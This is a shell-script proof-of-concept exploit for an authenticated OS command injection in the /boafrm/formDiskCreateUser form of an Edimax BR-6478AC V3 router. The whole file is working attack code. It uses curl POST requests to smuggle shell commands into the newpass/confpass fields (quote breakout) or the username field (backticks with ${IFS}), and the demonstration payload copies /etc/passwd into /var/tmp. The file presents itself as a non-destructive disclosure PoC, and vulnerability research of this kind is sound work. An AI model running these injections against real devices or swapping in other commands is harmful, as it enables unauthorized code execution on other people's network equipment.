#!/bin/sh
# ---------------------------------------------------------------------------
# Non-destructive PoC for CVE-TBD
# Edimax BR-6478AC V3 1.0.15 - OS Command Injection in /boafrm/formDiskCreateUser
#
# The payload copies /etc/passwd to /var/tmp/ as a marker. It does NOT modify
# device configuration, does NOT alter firmware, does NOT install persistence.
#
# Usage:
# ./poc.sh <router-ip> <webuicookie-session-value> [newpass|username]
#
# The session value is obtained by logging in to the web UI; the endpoint is
# protected by the firmware's authentication layers.
# ---------------------------------------------------------------------------
set -u
HOST="${1:-}"
SESS="${2:-}"
CHANNEL="${3:-newpass}"

if [ -z "$HOST" ] || [ -z "$SESS" ]; then
 echo "usage: $0 <router-ip> <webuicookie-session> [newpass|username]" >&2
 exit 1
fi

URL="http://${HOST}/boafrm/formDiskCreateUser"

case "$CHANNEL" in
 newpass)
 PAYLOAD='abcd";cp /etc/passwd /var/tmp/PWNED;echo "'
 echo "[*] channel=newpass payload=${PAYLOAD}"
 curl -s -i -m 20 -X POST "$URL" \
 -b "webuicookie=${SESS}" \
 --data-urlencode 'username=gooduser' \
 --data-urlencode "newpass=${PAYLOAD}" \
 --data-urlencode "confpass=${PAYLOAD}" \
 --data-urlencode 'Group=users' \
 --data-urlencode 'submit-url=/accountmng.htm'
 ;;
 username)
 PAYLOAD='ab`cp${IFS}/etc/passwd${IFS}/var/tmp/INJ2`'
 echo "[*] channel=username payload=${PAYLOAD}"
 curl -s -i -m 20 -X POST "$URL" \
 -b "webuicookie=${SESS}" \
 --data-urlencode "username=${PAYLOAD}" \
 --data-urlencode 'newpass=pass1234' \
 --data-urlencode 'confpass=pass1234' \
 --data-urlencode 'Group=users' \
 --data-urlencode 'submit-url=/accountmng.htm'
 ;;
 *)
 echo "unknown channel: $CHANNEL" >&2; exit 1;;
esac

echo
echo "[*] Expected observable side effect (check ON THE DEVICE, e.g. via serial console):"
if [ "$CHANNEL" = "newpass" ]; then
 echo " ls -l /var/tmp/PWNED"
else
 echo " ls -l /var/tmp/INJ2"
fi
echo "[*] A normal (non-injecting) request returns 302 to submit-url and creates no file."
